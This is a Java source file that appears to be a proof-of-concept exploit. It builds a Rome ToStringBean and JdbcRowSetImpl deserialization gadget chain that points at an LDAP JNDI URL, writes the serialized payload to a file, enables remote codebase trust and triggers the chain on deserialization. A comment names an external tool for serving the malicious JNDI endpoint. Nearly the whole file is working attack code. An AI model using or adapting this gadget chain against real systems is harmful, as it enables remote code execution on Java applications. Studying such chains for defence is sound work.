package cn.rui0.idea;

import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;

import javax.sql.rowset.BaseRowSet;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Arrays;

/**
 * Created by ruilin on 2020/2/15.
 * This gadget is support deserialization,but it's limited to the JDK version.
 */
public class Gadget2 {
    public static Field getField(Class<?> clazz, String fieldName) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if(field != null) {
                field.setAccessible(true);
            } else if(clazz.getSuperclass() != null) {
                field = getField(clazz.getSuperclass(), fieldName);
            }

            return field;
        } catch (NoSuchFieldException var3) {
            if(!clazz.getSuperclass().equals(Object.class)) {
                return getField(clazz.getSuperclass(), fieldName);
            } else {
                throw var3;
            }
        }
    }
    public static JdbcRowSetImpl makeJNDIRowSet(String jndiUrl) throws Exception {
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName(jndiUrl);
        rs.setMatchColumn("foo");
        getField(BaseRowSet.class, "listeners").set(rs, (Object)null);
        return rs;
    }

    public static void makeSer(String jndi) throws Exception {
        String jndiUrl = jndi;
        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, makeJNDIRowSet(jndiUrl));
        FileOutputStream fos = new FileOutputStream("test.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(item);
        oos.flush();
    }


    public static void main(String[] args) throws Exception {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");

        // use https://github.com/welk1n/JNDI-Injection-Exploit this tool to create a JNDI server to attack.
        makeSer("ldap://127.0.0.1:1389/fflz1s");


        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("test.ser"));
        Object s = ois.readObject();
        ois.close();


        System.out.printf("breakpoint here");


        Object[] arguments ={s};
        throw new Exception("xxx"+ Arrays.toString(arguments));
    }
}
